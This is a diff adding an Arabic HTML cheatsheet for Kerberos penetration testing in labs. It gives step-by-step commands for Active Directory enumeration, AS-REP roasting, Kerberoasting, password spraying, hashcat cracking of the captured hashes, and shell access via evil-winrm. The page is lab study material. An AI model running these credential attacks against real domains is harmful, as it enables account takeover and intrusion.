@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width,initial-scale=1" name="viewport"/>
+<title>Kerberos Cheatsheet</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+</style>
+</head>
+<body>
+<div class="wrap">
+<div class="hero">
+<span class="tag">PORT 88 / TCP &amp; UDP — KERBEROS</span>
+<h1>Kerberos — من اكتشاف الـDomain إلى Roasting واختبار الوصول</h1>
+<p>مرجع سريع أثناء اللاب — Domain Detection، User Enumeration، AS-REP Roasting، Kerberoasting، واستخدام Credentials</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div>
+</div>
+<div class="portnote">
+<b>ملاحظة عن البورت:</b> Kerberos يعمل افتراضيًا على <b>88/TCP و88/UDP</b>. وجوده مع DNS وLDAP وSMB غالبًا يدل على بيئة Active Directory، والوقت واسم الـDomain عاملان أساسيان لنجاح المصادقة.
+</div>
+<div class="toc">
+<span class="ttl">الفهرس</span>
+<ol>
+<li><a href="#s1">Reconnaissance</a></li>
+<li><a href="#s2">Port Scanning</a></li>
+<li><a href="#s3">Enumeration</a></li>
+<li><a href="#s4">Credential Testing</a></li>
+<li><a href="#s5">Credential / Ticket Attacks</a></li>
+<li><a href="#s6">Post-Exploitation</a></li>
+</ol>
+</div>
+<div class="stage" id="s1">
+<h2>1. Reconnaissance</h2>
+<p class="desc">حدد هل الهدف Domain Controller أو جزء من Active Directory قبل التعمق في Kerberos.</p>
+<div class="step">
+<div class="step-title">معرفة الشبكة والهدف <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ip a
+ip route</div>
+</div>
+<div class="step">
+<div class="step-title">فحص خدمات AD الأساسية <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -sV -p53,88,135,139,389,445,464,636,3268,3269 [TARGET]</div>
+<div class="note">وجود عدة خدمات AD مع 88/TCP غالبًا يشير إلى Domain Controller.</div>
+</div>
+<div class="tip">Kerberos يستخدم عادة <b>88/TCP و88/UDP</b> للمصادقة، ويعتمد بشدة على الوقت واسم الـDomain الصحيح.</div>
+</div><div class="stage" id="s2">
+<h2>2. Port Scanning</h2>
+<p class="desc">أكد وجود Kerberos ثم اربطه بباقي خدمات Active Directory.</p>
+<div class="step">
+<div class="step-title">فحص Kerberos <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -sV -p88 [TARGET]</div>
+<div class="result">✓ ظهور kerberos-sec على 88 يعني أن Kerberos متاح على الهدف.</div>
+</div>
+<div class="step">
+<div class="step-title">فحص UDP <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">sudo nmap -Pn -sU -sV -p88 [TARGET]</div>
+</div>
+<div class="step">
+<div class="step-title">فحص AD أوسع <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -Pn -sV -p53,88,135,139,389,445,464,636,3268,3269 [TARGET]</div>
+<div class="note">يساعدك تربط Kerberos مع LDAP/SMB/DNS بدل التعامل معه كخدمة منفصلة.</div>
+</div>
+</div><div class="stage" id="s3">
+<h2>3. Enumeration</h2>
+<p class="desc">الهدف الأساسي هنا هو معرفة الـDomain، أسماء المستخدمين، ووجود حسابات قابلة لمسارات Kerberos شائعة.</p>
+<div class="step">
+<div class="step-title">استخراج Domain من SMB <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">nmap -p445 --script=smb-os-discovery [TARGET]</div>
+<div class="note">إذا أعطاك Domain/Computer name سجّلها لأنها ضرورية للأدوات التالية.</div>
+</div>
+<div class="step">
+<div class="step-title">Kerberos User Enumeration عبر Kerbrute <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">kerbrute userenum -d [DOMAIN] --dc [TARGET] [USERLIST]</div>
+<div class="note">يعتمد على استجابات Kerberos للتحقق من وجود المستخدمين.</div>
+</div>
+<div class="step">
+<div class="step-title">Enum4linux-ng كمسار مساعد <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">enum4linux-ng -A [TARGET]</div>
+<div class="note">قد يعطي Domain ومستخدمين ومعلومات SMB مرتبطة بالـAD إذا كانت السياسات تسمح.</div>
+</div>
+<div class="step">
+<div class="step-title">LDAP Enumeration عند توفر Anonymous/Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ldapsearch -x -H ldap://[TARGET] -s base</div>
+<div class="note">استخدم LDAP لتأكيد naming context والـDomain إذا كان الوصول يسمح.</div>
+</div>
+<div class="tip">إذا ما عندك اسم Domain صحيح، كثير من أدوات Kerberos تفشل حتى لو المنفذ مفتوح.</div>
+</div><div class="stage" id="s4">
+<h2>4. Credential Testing</h2>
+<p class="desc">اختبر بيانات الاعتماد أو ضعف Kerberos بدون حرق الحسابات أو القفز مباشرة إلى brute force.</p>
+<div class="step">
+<div class="step-title">فحص AS-REP Roastable Users <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">impacket-GetNPUsers [DOMAIN]/ -dc-ip [TARGET] -usersfile [USERLIST] -no-pass</div>
+<div class="note">يبحث عن حسابات لا تتطلب Kerberos pre-authentication.</div>
+<div class="result">✓ الحصول على hash بصيغة $krb5asrep$ يعني أن الحساب قابل لـAS-REP Roasting.</div>
+</div>
+<div class="step">
+<div class="step-title">اختبار Credentials مع Kerbrute <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">kerbrute passwordspray -d [DOMAIN] --dc [TARGET] [USERLIST] '[PASSWORD]'</div>
+<div class="note">استخدم Password Spraying بدل brute force كثيف لتقليل خطر lockout.</div>
+</div>
+<div class="step">
+<div class="step-title">طلب TGT ببيانات صحيحة <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">impacket-getTGT [DOMAIN]/[USERNAME]:'[PASSWORD]' -dc-ip [TARGET]</div>
+<div class="note">نجاح إصدار TGT يؤكد أن الاعتماد صالح.</div>
+</div>
+<div class="danger"><b>تحذير:</b> سياسات Active Directory قد تقفل الحسابات. لا تستخدم Password Spraying إلا داخل Lab أو بيئة مصرّح بها وبمعدل منخفض.</div>
+</div><div class="stage" id="s5">
+<h2>5. Credential / Ticket Attacks</h2>
+<p class="desc">استغلال Kerberos الشائع يدور حول AS-REP Roasting وKerberoasting وإعادة استخدام التذاكر، وليس CVE عشوائي.</p>
+<div class="step">
+<div class="step-title">AS-REP Roasting <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">impacket-GetNPUsers [DOMAIN]/ -dc-ip [TARGET] -usersfile [USERLIST] -format hashcat -outputfile asrep.hash</div>
+<div class="note">احصل على hash فقط إذا كان الحساب بدون pre-authentication.</div>
+</div>
+<div class="step">
+<div class="step-title">Kerberoasting مع Credentials <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">impacket-GetUserSPNs [DOMAIN]/[USERNAME]:'[PASSWORD]' -dc-ip [TARGET] -request -outputfile kerberoast.hash</div>
+<div class="note">يطلب Service Tickets للحسابات التي لديها SPN.</div>
+</div>
+<div class="step">
+<div class="step-title">Crack AS-REP Hash <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">hashcat -m 18200 asrep.hash [WORDLIST]</div>
+</div>
+<div class="step">
+<div class="step-title">Crack Kerberoast Hash <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">hashcat -m 13100 kerberoast.hash [WORDLIST]</div>
+</div>
+<div class="tip">نجاح cracking لا يعني أن الحساب Admin. اختبر صلاحيات الحساب على SMB/WinRM/RDP/LDAP حسب الخدمات المفتوحة.</div>
+</div><div class="stage" id="s6">
+<h2>6. Post-Exploitation</h2>
+<p class="desc">بعد الحصول على Credentials أو Ticket صالح، تحقق من نطاق الصلاحيات وانتقل للخدمة المناسبة.</p>
+<div class="step">
+<div class="step-title">اختبار SMB Access <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">smbclient -L //[TARGET] -U '[DOMAIN]/[USERNAME]%[PASSWORD]'</div>
+<div class="note">إذا نجح، انتقل إلى SMB Cheatsheet للتعداد والاستغلال المناسب.</div>
+</div>
+<div class="step">
+<div class="step-title">اختبار WinRM عند توفره <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">evil-winrm -i [TARGET] -u [USERNAME] -p '[PASSWORD]'</div>
+<div class="note">إذا كان الحساب ضمن Remote Management Users أو Administrators فقد تحصل على shell.</div>
+</div>
+<div class="step">
+<div class="step-title">فحص صلاحيات LDAP بالمستخدم <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">ldapsearch -x -H ldap://[TARGET] -D '[USERNAME]@[DOMAIN]' -w '[PASSWORD]' -b '[BASE_DN]'</div>
+<div class="note">استخدم الحساب لجمع AD information ضمن النطاق المصرح.</div>
+</div>
+<div class="step">
+<div class="step-title">التحقق من الوقت عند مشاكل Kerberos <span class="where">KALI TERMINAL</span></div>
+<div class="cmd">sudo ntpdate [TARGET]</div>
+<div class="note">Kerberos حساس لفارق الوقت؛ مزامنة الوقت قد تحل أخطاء KRB_AP_ERR_SKEW داخل اللاب.</div>
+</div>
+<div class="tip">بعد هذه المرحلة انتقل إلى Cheatsheet الخدمة المناسبة: SMB أو WinRM أو LDAP أو RDP. لا تكرر كل Active Directory داخل ملف Kerberos.</div>
+</div>
+<footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+    هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+    يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+    مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+  </div>
+</footer>
+</div>
+</body>
+</html>
